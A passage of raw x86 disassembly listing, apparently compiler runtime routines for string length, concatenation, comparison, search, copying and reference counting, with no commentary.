  403682:	85 db                	test   %ebx,%ebx
  403684:	7c 0f                	jl     0x403695
  403686:	8d 54 24 04          	lea    0x4(%esp),%edx
  40368a:	8b c7                	mov    %edi,%eax
  40368c:	8b cb                	mov    %ebx,%ecx
  40368e:	e8 41 ff ff ff       	call   0x4035d4
  403693:	eb 2c                	jmp    0x4036c1
  403695:	8b dd                	mov    %ebp,%ebx
  403697:	03 db                	add    %ebx,%ebx
  403699:	8b c7                	mov    %edi,%eax
  40369b:	8b d3                	mov    %ebx,%edx
  40369d:	e8 1e 04 00 00       	call   0x403ac0
  4036a2:	56                   	push   %esi
  4036a3:	8b 07                	mov    (%edi),%eax
  4036a5:	8b 4c 24 04          	mov    0x4(%esp),%ecx
  4036a9:	8b d3                	mov    %ebx,%edx
  4036ab:	e8 54 ff ff ff       	call   0x403604
  4036b0:	8b d8                	mov    %eax,%ebx
  4036b2:	85 db                	test   %ebx,%ebx
  4036b4:	7d 02                	jge    0x4036b8
  4036b6:	33 db                	xor    %ebx,%ebx
  4036b8:	8b c7                	mov    %edi,%eax
  4036ba:	8b d3                	mov    %ebx,%edx
  4036bc:	e8 ff 03 00 00       	call   0x403ac0
  4036c1:	81 c4 04 10 00 00    	add    $0x1004,%esp
  4036c7:	5d                   	pop    %ebp
  4036c8:	5f                   	pop    %edi
  4036c9:	5e                   	pop    %esi
  4036ca:	5b                   	pop    %ebx
  4036cb:	c3                   	ret
  4036cc:	52                   	push   %edx
  4036cd:	89 e2                	mov    %esp,%edx
  4036cf:	b9 01 00 00 00       	mov    $0x1,%ecx
  4036d4:	e8 fb fe ff ff       	call   0x4035d4
  4036d9:	5a                   	pop    %edx
  4036da:	c3                   	ret
  4036db:	90                   	nop
  4036dc:	31 c9                	xor    %ecx,%ecx
  4036de:	85 d2                	test   %edx,%edx
  4036e0:	74 21                	je     0x403703
  4036e2:	52                   	push   %edx
  4036e3:	3a 0a                	cmp    (%edx),%cl
  4036e5:	74 17                	je     0x4036fe
  4036e7:	3a 4a 01             	cmp    0x1(%edx),%cl
  4036ea:	74 11                	je     0x4036fd
  4036ec:	3a 4a 02             	cmp    0x2(%edx),%cl
  4036ef:	74 0b                	je     0x4036fc
  4036f1:	3a 4a 03             	cmp    0x3(%edx),%cl
  4036f4:	74 05                	je     0x4036fb
  4036f6:	83 c2 04             	add    $0x4,%edx
  4036f9:	eb e8                	jmp    0x4036e3
  4036fb:	42                   	inc    %edx
  4036fc:	42                   	inc    %edx
  4036fd:	42                   	inc    %edx
  4036fe:	89 d1                	mov    %edx,%ecx
  403700:	5a                   	pop    %edx
  403701:	29 d1                	sub    %edx,%ecx
  403703:	e9 cc fe ff ff       	jmp    0x4035d4
  403708:	c3                   	ret
  403709:	8d 40 00             	lea    0x0(%eax),%eax
  40370c:	31 c9                	xor    %ecx,%ecx
  40370e:	85 d2                	test   %edx,%edx
  403710:	74 2d                	je     0x40373f
  403712:	52                   	push   %edx
  403713:	66 3b 0a             	cmp    (%edx),%cx
  403716:	74 20                	je     0x403738
  403718:	66 3b 4a 02          	cmp    0x2(%edx),%cx
  40371c:	74 17                	je     0x403735
  40371e:	66 3b 4a 04          	cmp    0x4(%edx),%cx
  403722:	74 0e                	je     0x403732
  403724:	66 3b 4a 06          	cmp    0x6(%edx),%cx
  403728:	74 05                	je     0x40372f
  40372a:	83 c2 08             	add    $0x8,%edx
  40372d:	eb e4                	jmp    0x403713
  40372f:	83 c2 02             	add    $0x2,%edx
  403732:	83 c2 02             	add    $0x2,%edx
  403735:	83 c2 02             	add    $0x2,%edx
  403738:	89 d1                	mov    %edx,%ecx
  40373a:	5a                   	pop    %edx
  40373b:	29 d1                	sub    %edx,%ecx
  40373d:	d1 e9                	shr    $1,%ecx
  40373f:	e9 fc fe ff ff       	jmp    0x403640
  403744:	c3                   	ret
  403745:	8d 40 00             	lea    0x0(%eax),%eax
  403748:	57                   	push   %edi
  403749:	50                   	push   %eax
  40374a:	51                   	push   %ecx
  40374b:	89 d7                	mov    %edx,%edi
  40374d:	31 c0                	xor    %eax,%eax
  40374f:	f2 ae                	repnz scas %es:(%edi),%al
  403751:	75 02                	jne    0x403755
  403753:	f7 d1                	not    %ecx
  403755:	58                   	pop    %eax
  403756:	01 c1                	add    %eax,%ecx
  403758:	58                   	pop    %eax
  403759:	5f                   	pop    %edi
  40375a:	e9 75 fe ff ff       	jmp    0x4035d4
  40375f:	c3                   	ret
  403760:	57                   	push   %edi
  403761:	50                   	push   %eax
  403762:	51                   	push   %ecx
  403763:	89 d7                	mov    %edx,%edi
  403765:	31 c0                	xor    %eax,%eax
  403767:	f2 66 af             	repnz scas %es:(%edi),%ax
  40376a:	75 02                	jne    0x40376e
  40376c:	f7 d1                	not    %ecx
  40376e:	58                   	pop    %eax
  40376f:	01 c1                	add    %eax,%ecx
  403771:	58                   	pop    %eax
  403772:	5f                   	pop    %edi
  403773:	e9 c8 fe ff ff       	jmp    0x403640
  403778:	c3                   	ret
  403779:	8d 40 00             	lea    0x0(%eax),%eax
  40377c:	31 c9                	xor    %ecx,%ecx
  40377e:	85 d2                	test   %edx,%edx
  403780:	74 05                	je     0x403787
  403782:	8b 4a fc             	mov    -0x4(%edx),%ecx
  403785:	d1 e9                	shr    $1,%ecx
  403787:	e9 b4 fe ff ff       	jmp    0x403640
  40378c:	c3                   	ret
  40378d:	8d 40 00             	lea    0x0(%eax),%eax
  403790:	85 c0                	test   %eax,%eax
  403792:	74 03                	je     0x403797
  403794:	8b 40 fc             	mov    -0x4(%eax),%eax
  403797:	c3                   	ret
  403798:	85 d2                	test   %edx,%edx
  40379a:	74 3f                	je     0x4037db
  40379c:	8b 08                	mov    (%eax),%ecx
  40379e:	85 c9                	test   %ecx,%ecx
  4037a0:	0f 84 92 fd ff ff    	je     0x403538
  4037a6:	53                   	push   %ebx
  4037a7:	56                   	push   %esi
  4037a8:	57                   	push   %edi
  4037a9:	89 c3                	mov    %eax,%ebx
  4037ab:	89 d6                	mov    %edx,%esi
  4037ad:	8b 79 fc             	mov    -0x4(%ecx),%edi
  4037b0:	8b 56 fc             	mov    -0x4(%esi),%edx
  4037b3:	01 fa                	add    %edi,%edx
  4037b5:	39 ce                	cmp    %ecx,%esi
  4037b7:	74 17                	je     0x4037d0
  4037b9:	e8 02 03 00 00       	call   0x403ac0
  4037be:	89 f0                	mov    %esi,%eax
  4037c0:	8b 4e fc             	mov    -0x4(%esi),%ecx
  4037c3:	8b 13                	mov    (%ebx),%edx
  4037c5:	01 fa                	add    %edi,%edx
  4037c7:	e8 5c ee ff ff       	call   0x402628
  4037cc:	5f                   	pop    %edi
  4037cd:	5e                   	pop    %esi
  4037ce:	5b                   	pop    %ebx
  4037cf:	c3                   	ret
  4037d0:	e8 eb 02 00 00       	call   0x403ac0
  4037d5:	8b 03                	mov    (%ebx),%eax
  4037d7:	89 f9                	mov    %edi,%ecx
  4037d9:	eb e8                	jmp    0x4037c3
  4037db:	c3                   	ret
  4037dc:	85 d2                	test   %edx,%edx
  4037de:	74 61                	je     0x403841
  4037e0:	85 c9                	test   %ecx,%ecx
  4037e2:	0f 84 50 fd ff ff    	je     0x403538
  4037e8:	3b 10                	cmp    (%eax),%edx
  4037ea:	74 5c                	je     0x403848
  4037ec:	3b 08                	cmp    (%eax),%ecx
  4037ee:	74 0e                	je     0x4037fe
  4037f0:	50                   	push   %eax
  4037f1:	51                   	push   %ecx
  4037f2:	e8 41 fd ff ff       	call   0x403538
  4037f7:	5a                   	pop    %edx
  4037f8:	58                   	pop    %eax
  4037f9:	e9 9a ff ff ff       	jmp    0x403798
  4037fe:	53                   	push   %ebx
  4037ff:	56                   	push   %esi
  403800:	57                   	push   %edi
  403801:	89 d3                	mov    %edx,%ebx
  403803:	89 ce                	mov    %ecx,%esi
  403805:	50                   	push   %eax
  403806:	8b 43 fc             	mov    -0x4(%ebx),%eax
  403809:	03 46 fc             	add    -0x4(%esi),%eax
  40380c:	e8 97 fd ff ff       	call   0x4035a8
  403811:	89 c7                	mov    %eax,%edi
  403813:	89 c2                	mov    %eax,%edx
  403815:	89 d8                	mov    %ebx,%eax
  403817:	8b 4b fc             	mov    -0x4(%ebx),%ecx
  40381a:	e8 09 ee ff ff       	call   0x402628
  40381f:	89 fa                	mov    %edi,%edx
  403821:	89 f0                	mov    %esi,%eax
  403823:	8b 4e fc             	mov    -0x4(%esi),%ecx
  403826:	03 53 fc             	add    -0x4(%ebx),%edx
  403829:	e8 fa ed ff ff       	call   0x402628
  40382e:	58                   	pop    %eax
  40382f:	89 fa                	mov    %edi,%edx
  403831:	85 ff                	test   %edi,%edi
  403833:	74 03                	je     0x403838
  403835:	ff 4f f8             	decl   -0x8(%edi)
  403838:	e8 fb fc ff ff       	call   0x403538
  40383d:	5f                   	pop    %edi
  40383e:	5e                   	pop    %esi
  40383f:	5b                   	pop    %ebx
  403840:	c3                   	ret
  403841:	89 ca                	mov    %ecx,%edx
  403843:	e9 f0 fc ff ff       	jmp    0x403538
  403848:	89 ca                	mov    %ecx,%edx
  40384a:	e9 49 ff ff ff       	jmp    0x403798
  40384f:	c3                   	ret
  403850:	53                   	push   %ebx
  403851:	56                   	push   %esi
  403852:	57                   	push   %edi
  403853:	52                   	push   %edx
  403854:	50                   	push   %eax
  403855:	89 d3                	mov    %edx,%ebx
  403857:	31 ff                	xor    %edi,%edi
  403859:	8b 4c 94 14          	mov    0x14(%esp,%edx,4),%ecx
  40385d:	85 c9                	test   %ecx,%ecx
  40385f:	74 0c                	je     0x40386d
  403861:	39 08                	cmp    %ecx,(%eax)
  403863:	75 08                	jne    0x40386d
  403865:	89 cf                	mov    %ecx,%edi
  403867:	8b 41 fc             	mov    -0x4(%ecx),%eax
  40386a:	4a                   	dec    %edx
  40386b:	eb 02                	jmp    0x40386f
  40386d:	31 c0                	xor    %eax,%eax
  40386f:	8b 4c 94 14          	mov    0x14(%esp,%edx,4),%ecx
  403873:	85 c9                	test   %ecx,%ecx
  403875:	74 09                	je     0x403880
  403877:	03 41 fc             	add    -0x4(%ecx),%eax
  40387a:	39 cf                	cmp    %ecx,%edi
  40387c:	75 02                	jne    0x403880
  40387e:	31 ff                	xor    %edi,%edi
  403880:	4a                   	dec    %edx
  403881:	75 ec                	jne    0x40386f
  403883:	85 ff                	test   %edi,%edi
  403885:	74 17                	je     0x40389e
  403887:	89 c2                	mov    %eax,%edx
  403889:	8b 04 24             	mov    (%esp),%eax
  40388c:	8b 77 fc             	mov    -0x4(%edi),%esi
  40388f:	e8 2c 02 00 00       	call   0x403ac0
  403894:	8b 3c 24             	mov    (%esp),%edi
  403897:	ff 37                	push   (%edi)
  403899:	03 37                	add    (%edi),%esi
  40389b:	4b                   	dec    %ebx
  40389c:	eb 08                	jmp    0x4038a6
  40389e:	e8 05 fd ff ff       	call   0x4035a8
  4038a3:	50                   	push   %eax
  4038a4:	89 c6                	mov    %eax,%esi
  4038a6:	8b 44 9c 18          	mov    0x18(%esp,%ebx,4),%eax
  4038aa:	89 f2                	mov    %esi,%edx
  4038ac:	85 c0                	test   %eax,%eax
  4038ae:	74 0a                	je     0x4038ba
  4038b0:	8b 48 fc             	mov    -0x4(%eax),%ecx
  4038b3:	01 ce                	add    %ecx,%esi
  4038b5:	e8 6e ed ff ff       	call   0x402628
  4038ba:	4b                   	dec    %ebx
  4038bb:	75 e9                	jne    0x4038a6
  4038bd:	5a                   	pop    %edx
  4038be:	58                   	pop    %eax
  4038bf:	85 ff                	test   %edi,%edi
  4038c1:	75 0c                	jne    0x4038cf
  4038c3:	85 d2                	test   %edx,%edx
  4038c5:	74 03                	je     0x4038ca
  4038c7:	ff 4a f8             	decl   -0x8(%edx)
  4038ca:	e8 69 fc ff ff       	call   0x403538
  4038cf:	5a                   	pop    %edx
  4038d0:	5f                   	pop    %edi
  4038d1:	5e                   	pop    %esi
  4038d2:	5b                   	pop    %ebx
  4038d3:	58                   	pop    %eax
  4038d4:	8d 24 94             	lea    (%esp,%edx,4),%esp
  4038d7:	ff e0                	jmp    *%eax
  4038d9:	c3                   	ret
  4038da:	8b c0                	mov    %eax,%eax
  4038dc:	53                   	push   %ebx
  4038dd:	56                   	push   %esi
  4038de:	57                   	push   %edi
  4038df:	89 c6                	mov    %eax,%esi
  4038e1:	89 d7                	mov    %edx,%edi
  4038e3:	39 d0                	cmp    %edx,%eax
  4038e5:	0f 84 8f 00 00 00    	je     0x40397a
  4038eb:	85 f6                	test   %esi,%esi
  4038ed:	74 68                	je     0x403957
  4038ef:	85 ff                	test   %edi,%edi
  4038f1:	74 6b                	je     0x40395e
  4038f3:	8b 46 fc             	mov    -0x4(%esi),%eax
  4038f6:	8b 57 fc             	mov    -0x4(%edi),%edx
  4038f9:	29 d0                	sub    %edx,%eax
  4038fb:	77 02                	ja     0x4038ff
  4038fd:	01 c2                	add    %eax,%edx
  4038ff:	52                   	push   %edx
  403900:	c1 ea 02             	shr    $0x2,%edx
  403903:	74 26                	je     0x40392b
  403905:	8b 0e                	mov    (%esi),%ecx
  403907:	8b 1f                	mov    (%edi),%ebx
  403909:	39 d9                	cmp    %ebx,%ecx
  40390b:	75 58                	jne    0x403965
  40390d:	4a                   	dec    %edx
  40390e:	74 15                	je     0x403925
  403910:	8b 4e 04             	mov    0x4(%esi),%ecx
  403913:	8b 5f 04             	mov    0x4(%edi),%ebx
  403916:	39 d9                	cmp    %ebx,%ecx
  403918:	75 4b                	jne    0x403965
  40391a:	83 c6 08             	add    $0x8,%esi
  40391d:	83 c7 08             	add    $0x8,%edi
  403920:	4a                   	dec    %edx
  403921:	75 e2                	jne    0x403905
  403923:	eb 06                	jmp    0x40392b
  403925:	83 c6 04             	add    $0x4,%esi
  403928:	83 c7 04             	add    $0x4,%edi
  40392b:	5a                   	pop    %edx
  40392c:	83 e2 03             	and    $0x3,%edx
  40392f:	74 22                	je     0x403953
  403931:	8b 0e                	mov    (%esi),%ecx
  403933:	8b 1f                	mov    (%edi),%ebx
  403935:	38 d9                	cmp    %bl,%cl
  403937:	75 41                	jne    0x40397a
  403939:	4a                   	dec    %edx
  40393a:	74 17                	je     0x403953
  40393c:	38 fd                	cmp    %bh,%ch
  40393e:	75 3a                	jne    0x40397a
  403940:	4a                   	dec    %edx
  403941:	74 10                	je     0x403953
  403943:	81 e3 00 00 ff 00    	and    $0xff0000,%ebx
  403949:	81 e1 00 00 ff 00    	and    $0xff0000,%ecx
  40394f:	39 d9                	cmp    %ebx,%ecx
  403951:	75 27                	jne    0x40397a
  403953:	01 c0                	add    %eax,%eax
  403955:	eb 23                	jmp    0x40397a
  403957:	8b 57 fc             	mov    -0x4(%edi),%edx
  40395a:	29 d0                	sub    %edx,%eax
  40395c:	eb 1c                	jmp    0x40397a
  40395e:	8b 46 fc             	mov    -0x4(%esi),%eax
  403961:	29 d0                	sub    %edx,%eax
  403963:	eb 15                	jmp    0x40397a
  403965:	5a                   	pop    %edx
  403966:	38 d9                	cmp    %bl,%cl
  403968:	75 10                	jne    0x40397a
  40396a:	38 fd                	cmp    %bh,%ch
  40396c:	75 0c                	jne    0x40397a
  40396e:	c1 e9 10             	shr    $0x10,%ecx
  403971:	c1 eb 10             	shr    $0x10,%ebx
  403974:	38 d9                	cmp    %bl,%cl
  403976:	75 02                	jne    0x40397a
  403978:	38 fd                	cmp    %bh,%ch
  40397a:	5f                   	pop    %edi
  40397b:	5e                   	pop    %esi
  40397c:	5b                   	pop    %ebx
  40397d:	c3                   	ret
  40397e:	8b c0                	mov    %eax,%eax
  403980:	85 c0                	test   %eax,%eax
  403982:	74 0a                	je     0x40398e
  403984:	8b 50 f8             	mov    -0x8(%eax),%edx
  403987:	42                   	inc    %edx
  403988:	7e 04                	jle    0x40398e
  40398a:	f0 ff 40 f8          	lock incl -0x8(%eax)
  40398e:	c3                   	ret
  40398f:	90                   	nop
  403990:	85 c0                	test   %eax,%eax
  403992:	74 02                	je     0x403996
  403994:	c3                   	ret
  403995:	00 b8 95 39 40 00    	add    %bh,0x403995(%eax)
  40399b:	c3                   	ret
  40399c:	8b 10                	mov    (%eax),%edx
  40399e:	85 d2                	test   %edx,%edx
  4039a0:	74 38                	je     0x4039da
  4039a2:	8b 4a f8             	mov    -0x8(%edx),%ecx
  4039a5:	49                   	dec    %ecx
  4039a6:	74 32                	je     0x4039da
  4039a8:	53                   	push   %ebx
  4039a9:	89 c3                	mov    %eax,%ebx
  4039ab:	8b 42 fc             	mov    -0x4(%edx),%eax
  4039ae:	e8 f5 fb ff ff       	call   0x4035a8
  4039b3:	89 c2                	mov    %eax,%edx
  4039b5:	8b 03                	mov    (%ebx),%eax
  4039b7:	89 13                	mov    %edx,(%ebx)
  4039b9:	50                   	push   %eax
  4039ba:	8b 48 fc             	mov    -0x4(%eax),%ecx
  4039bd:	e8 66 ec ff ff       	call   0x402628
  4039c2:	58                   	pop    %eax
  4039c3:	8b 48 f8             	mov    -0x8(%eax),%ecx
  4039c6:	49                   	dec    %ecx
  4039c7:	7c 0e                	jl     0x4039d7
  4039c9:	f0 ff 48 f8          	lock decl -0x8(%eax)
  4039cd:	75 08                	jne    0x4039d7
  4039cf:	8d 40 f8             	lea    -0x8(%eax),%eax
  4039d2:	e8 79 eb ff ff       	call   0x402550
  4039d7:	8b 13                	mov    (%ebx),%edx
  4039d9:	5b                   	pop    %ebx
  4039da:	89 d0                	mov    %edx,%eax
  4039dc:	c3                   	ret
  4039dd:	8d 40 00             	lea    0x0(%eax),%eax
  4039e0:	e9 b7 ff ff ff       	jmp    0x40399c
  4039e5:	c3                   	ret
  4039e6:	8b c0                	mov    %eax,%eax
  4039e8:	e9 af ff ff ff       	jmp    0x40399c
  4039ed:	c3                   	ret
  4039ee:	8b c0                	mov    %eax,%eax
  4039f0:	53                   	push   %ebx
  4039f1:	85 c0                	test   %eax,%eax
  4039f3:	74 2d                	je     0x403a22
  4039f5:	8b 58 fc             	mov    -0x4(%eax),%ebx
  4039f8:	85 db                	test   %ebx,%ebx
  4039fa:	74 26                	je     0x403a22
  4039fc:	4a                   	dec    %edx
  4039fd:	7c 1b                	jl     0x403a1a
  4039ff:	39 da                	cmp    %ebx,%edx
  403a01:	7d 1f                	jge    0x403a22
  403a03:	29 d3                	sub    %edx,%ebx
  403a05:	85 c9                	test   %ecx,%ecx
  403a07:	7c 19                	jl     0x403a22
  403a09:	39 d9                	cmp    %ebx,%ecx
  403a0b:	7f 11                	jg     0x403a1e
  403a0d:	01 c2                	add    %eax,%edx
  403a0f:	8b 44 24 08          	mov    0x8(%esp),%eax
  403a13:	e8 bc fb ff ff       	call   0x4035d4
  403a18:	eb 11                	jmp    0x403a2b
  403a1a:	31 d2                	xor    %edx,%edx
  403a1c:	eb e5                	jmp    0x403a03
  403a1e:	89 d9                	mov    %ebx,%ecx
  403a20:	eb eb                	jmp    0x403a0d
  403a22:	8b 44 24 08          	mov    0x8(%esp),%eax
  403a26:	e8 b9 fa ff ff       	call   0x4034e4
  403a2b:	5b                   	pop    %ebx
  403a2c:	c2 04 00             	ret    $0x4
  403a2f:	c3                   	ret
  403a30:	53                   	push   %ebx
  403a31:	56                   	push   %esi
  403a32:	57                   	push   %edi
  403a33:	89 c3                	mov    %eax,%ebx
  403a35:	89 d6                	mov    %edx,%esi
  403a37:	89 cf                	mov    %ecx,%edi
  403a39:	e8 a2 ff ff ff       	call   0x4039e0
  403a3e:	8b 13                	mov    (%ebx),%edx
  403a40:	85 d2                	test   %edx,%edx
  403a42:	74 30                	je     0x403a74
  403a44:	8b 4a fc             	mov    -0x4(%edx),%ecx
  403a47:	4e                   	dec    %esi
  403a48:	7c 2a                	jl     0x403a74
  403a4a:	39 ce                	cmp    %ecx,%esi
  403a4c:	7d 26                	jge    0x403a74
  403a4e:	85 ff                	test   %edi,%edi
  403a50:	7e 22                	jle    0x403a74
  403a52:	29 f1                	sub    %esi,%ecx
  403a54:	39 cf                	cmp    %ecx,%edi
  403a56:	7e 02                	jle    0x403a5a
  403a58:	89 cf                	mov    %ecx,%edi
  403a5a:	29 f9                	sub    %edi,%ecx
  403a5c:	01 f2                	add    %esi,%edx
  403a5e:	8d 04 17             	lea    (%edi,%edx,1),%eax
  403a61:	e8 c2 eb ff ff       	call   0x402628
  403a66:	8b 13                	mov    (%ebx),%edx
  403a68:	89 d8                	mov    %ebx,%eax
  403a6a:	8b 52 fc             	mov    -0x4(%edx),%edx
  403a6d:	29 fa                	sub    %edi,%edx
  403a6f:	e8 4c 00 00 00       	call   0x403ac0
  403a74:	5f                   	pop    %edi
  403a75:	5e                   	pop    %esi
  403a76:	5b                   	pop    %ebx
  403a77:	c3                   	ret
  403a78:	85 c0                	test   %eax,%eax
  403a7a:	74 40                	je     0x403abc
  403a7c:	85 d2                	test   %edx,%edx
  403a7e:	74 31                	je     0x403ab1
  403a80:	53                   	push   %ebx
  403a81:	56                   	push   %esi
  403a82:	57                   	push   %edi
  403a83:	89 c6                	mov    %eax,%esi
  403a85:	89 d7                	mov    %edx,%edi
  403a87:	8b 4f fc             	mov    -0x4(%edi),%ecx
  403a8a:	57                   	push   %edi
  403a8b:	8b 56 fc             	mov    -0x4(%esi),%edx
  403a8e:	4a                   	dec    %edx
  403a8f:	78 1b                	js     0x403aac
  403a91:	8a 06                	mov    (%esi),%al
  403a93:	46                   	inc    %esi
  403a94:	29 d1                	sub    %edx,%ecx
  403a96:	7e 14                	jle    0x403aac
  403a98:	f2 ae                	repnz scas %es:(%edi),%al
  403a9a:	75 10                	jne    0x403aac
  403a9c:	89 cb                	mov    %ecx,%ebx
  403a9e:	56                   	push   %esi
  403a9f:	57                   	push   %edi
  403aa0:	89 d1                	mov    %edx,%ecx
  403aa2:	f3 a6                	repz cmpsb %es:(%edi),%ds:(%esi)
  403aa4:	5f                   	pop    %edi
  403aa5:	5e                   	pop    %esi
  403aa6:	74 0c                	je     0x403ab4
  403aa8:	89 d9                	mov    %ebx,%ecx
  403aaa:	eb ec                	jmp    0x403a98
  403aac:	5a                   	pop    %edx
  403aad:	31 c0                	xor    %eax,%eax
  403aaf:	eb 08                	jmp    0x403ab9
  403ab1:	31 c0                	xor    %eax,%eax
  403ab3:	c3                   	ret
  403ab4:	5a                   	pop    %edx
  403ab5:	89 f8                	mov    %edi,%eax
  403ab7:	29 d0                	sub    %edx,%eax
  403ab9:	5f                   	pop    %edi
  403aba:	5e                   	pop    %esi
  403abb:	5b                   	pop    %ebx
  403abc:	c3                   	ret
  403abd:	8d 40 00             	lea    0x0(%eax),%eax
  403ac0:	53                   	push   %ebx
  403ac1:	56                   	push   %esi
  403ac2:	57                   	push   %edi
  403ac3:	89 c3                	mov    %eax,%ebx
  403ac5:	89 d6                	mov    %edx,%esi
  403ac7:	31 ff                	xor    %edi,%edi
  403ac9:	85 d2                	test   %edx,%edx
  403acb:	7e 48                	jle    0x403b15
  403acd:	8b 03                	mov    (%ebx),%eax
  403acf:	85 c0                	test   %eax,%eax
  403ad1:	74 23                	je     0x403af6
  403ad3:	83 78 f8 01          	cmpl   $0x1,-0x8(%eax)
  403ad7:	75 1d                	jne    0x403af6
  403ad9:	83 e8 08             	sub    $0x8,%eax
  403adc:	83 c2 09             	add    $0x9,%edx
  403adf:	50                   	push   %eax
  403ae0:	89 e0                	mov    %esp,%eax
  403ae2:	e8 89 ea ff ff       	call   0x402570
  403ae7:	58                   	pop    %eax
  403ae8:	83 c0 08             	add    $0x8,%eax
  403aeb:	89 03                	mov    %eax,(%ebx)
  403aed:	89 70 fc             	mov    %esi,-0x4(%eax)
  403af0:	c6 04 06 00          	movb   $0x0,(%esi,%eax,1)
  403af4:	eb 28                	jmp    0x403b1e
  403af6:	89 d0                	mov    %edx,%eax
  403af8:	e8 ab fa ff ff       	call   0x4035a8
  403afd:	89 c7                	mov    %eax,%edi
  403aff:	8b 03                	mov    (%ebx),%eax
  403b01:	85 c0                	test   %eax,%eax
  403b03:	74 10                	je     0x403b15
  403b05:	89 fa                	mov    %edi,%edx
  403b07:	8b 48 fc             	mov    -0x4(%eax),%ecx
  403b0a:	39 f1                	cmp    %esi,%ecx
  403b0c:	7c 02                	jl     0x403b10
  403b0e:	89 f1                	mov    %esi,%ecx
  403b10:	e8 13 eb ff ff       	call   0x402628
  403b15:	89 d8                	mov    %ebx,%eax
  403b17:	e8 c8 f9 ff ff       	call   0x4034e4
  403b1c:	89 3b                	mov    %edi,(%ebx)
  403b1e:	5f                   	pop    %edi
  403b1f:	5e                   	pop    %esi
  403b20:	5b                   	pop    %ebx
  403b21:	c3                   	ret
  403b22:	8b c0                	mov    %eax,%eax
  403b24:	53                   	push   %ebx
  403b25:	56                   	push   %esi
  403b26:	57                   	push   %edi
  403b27:	89 c3                	mov    %eax,%ebx
  403b29:	89 d6                	mov    %edx,%esi
  403b2b:	89 cf                	mov    %ecx,%edi
  403b2d:	89 c8                	mov    %ecx,%eax
  403b2f:	e8 b0 f9 ff ff       	call   0x4034e4
  403b34:	85 f6                	test   %esi,%esi
  403b36:	7e 12                	jle    0x403b4a
  403b38:	89 f0                	mov    %esi,%eax
  403b3a:	e8 69 fa ff ff       	call   0x4035a8
  403b3f:	89 07                	mov    %eax,(%edi)
  403b41:	89 f2                	mov    %esi,%edx
  403b43:	88 d9                	mov    %bl,%cl
  403b45:	e8 96 ed ff ff       	call   0x4028e0
  403b4a:	5f                   	pop    %edi
  403b4b:	5e                   	pop    %esi
  403b4c:	5b                   	pop    %ebx
  403b4d:	c3                   	ret
  403b4e:	8b c0                	mov    %eax,%eax
  403b50:	b0 01                	mov    $0x1,%al
  403b52:	e9 bd ea ff ff       	jmp    0x402614
  403b57:	c3                   	ret
  403b58:	85 c0                	test   %eax,%eax
  403b5a:	74 10                	je     0x403b6c
  403b5c:	50                   	push   %eax
  403b5d:	6a 00                	push   $0x0
  403b5f:	e8 e4 d5 ff ff       	call   0x401148
  403b64:	85 c0                	test   %eax,%eax
  403b66:	0f 84 e4 ff ff ff    	je     0x403b50
  403b6c:	c3                   	ret
  403b6d:	8d 40 00             	lea    0x0(%eax),%eax
  403b70:	87 10                	xchg   %edx,(%eax)
  403b72:	85 d2                	test   %edx,%edx
  403b74:	74 06                	je     0x403b7c
  403b76:	52                   	push   %edx
  403b77:	e8 dc d5 ff ff       	call   0x401158
  403b7c:	c3                   	ret
  403b7d:	8d 40 00             	lea    0x0(%eax),%eax
  403b80:	8b 10                	mov    (%eax),%edx
  403b82:	85 d2                	test   %edx,%edx
  403b84:	74 0e                	je     0x403b94
  403b86:	c7 00 00 00 00 00    	movl   $0x0,(%eax)
  403b8c:	50                   	push   %eax
  403b8d:	52                   	push   %edx
  403b8e:	e8 c5 d5 ff ff       	call   0x401158
  403b93:	58                   	pop    %eax
  403b94:	c3                   	ret
  403b95:	8d 40 00             	lea    0x0(%eax),%eax
  403b98:	53                   	push   %ebx
  403b99:	56                   	push   %esi
  403b9a:	89 c3                	mov    %eax,%ebx
  403b9c:	89 d6                	mov    %edx,%esi
  403b9e:	8b 03                	mov    (%ebx),%eax
  403ba0:	85 c0                	test   %eax,%eax
  403ba2:	74 0c                	je     0x403bb0
  403ba4:	c7 03 00 00 00 00    	movl   $0x0,(%ebx)
  403baa:	50                   	push   %eax
  403bab:	e8 a8 d5 ff ff       	call   0x401158
  403bb0:	83 c3 04             	add    $0x4,%ebx
  403bb3:	4e                   	dec    %esi
  403bb4:	75 e8                	jne    0x403b9e
  403bb6:	5e                   	pop    %esi
  403bb7:	5b                   	pop    %ebx
  403bb8:	c3                   	ret
  403bb9:	8d 40 00             	lea    0x0(%eax),%eax
  403bbc:	85 d2                	test   %edx,%edx
  403bbe:	0f 84 bc ff ff ff    	je     0x403b80
  403bc4:	8b 4a fc             	mov    -0x4(%edx),%ecx
  403bc7:	d1 e9                	shr    $1,%ecx
  403bc9:	0f 84 b1 ff ff ff    	je     0x403b80
  403bcf:	51                   	push   %ecx
  403bd0:	52                   	push   %edx
  403bd1:	50                   	push   %eax
  403bd2:	e8 79 d5 ff ff       	call   0x401150
  403bd7:	85 c0                	test   %eax,%eax
  403bd9:	0f 84 71 ff ff ff    	je     0x403b50
  403bdf:	c3                   	ret
  403be0:	e9 d7 ff ff ff       	jmp    0x403bbc
  403be5:	c3                   	ret
  403be6:	8b c0                	mov    %eax,%eax
  403be8:	53                   	push   %ebx
  403be9:	56                   	push   %esi
  403bea:	57                   	push   %edi
  403beb:	55                   	push   %ebp
  403bec:	81 c4 04 f0 ff ff    	add    $0xfffff004,%esp
  403bf2:	50                   	push   %eax
  403bf3:	83 c4 fc             	add    $0xfffffffc,%esp
  403bf6:	8b f1                	mov    %ecx,%esi
  403bf8:	89 14 24             	mov    %edx,(%esp)
  403bfb:	8b f8                	mov    %eax,%edi
  403bfd:	85 f6                	test   %esi,%esi
  403bff:	7f 09                	jg     0x403c0a
  403c01:	8b c7                	mov    %edi,%eax
  403c03:	e8 78 ff ff ff       	call   0x403b80
  403c08:	eb 5d                	jmp    0x403c67
  403c0a:	8d 6e 01             	lea    0x1(%esi),%ebp
  403c0d:	81 fd ff 07 00 00    	cmp    $0x7ff,%ebp
  403c13:	7d 28                	jge    0x403c3d
  403c15:	56                   	push   %esi
  403c16:	8d 44 24 08          	lea    0x8(%esp),%eax
  403c1a:	8b 4c 24 04          	mov    0x4(%esp),%ecx
  403c1e:	ba ff 07 00 00       	mov    $0x7ff,%edx
  403c23:	e8 fc f9 ff ff       	call   0x403624
  403c28:	8b d8                	mov    %eax,%ebx
  403c2a:	85 db                	test   %ebx,%ebx
  403c2c:	7e 0f                	jle    0x403c3d
  403c2e:	8d 54 24 04          	lea    0x4(%esp),%edx
  403c32:	8b c7                	mov    %edi,%eax
  403c34:	8b cb                	mov    %ebx,%ecx
  403c36:	e8 39 00 00 00       	call   0x403c74
  403c3b:	eb 2a                	jmp    0x403c67
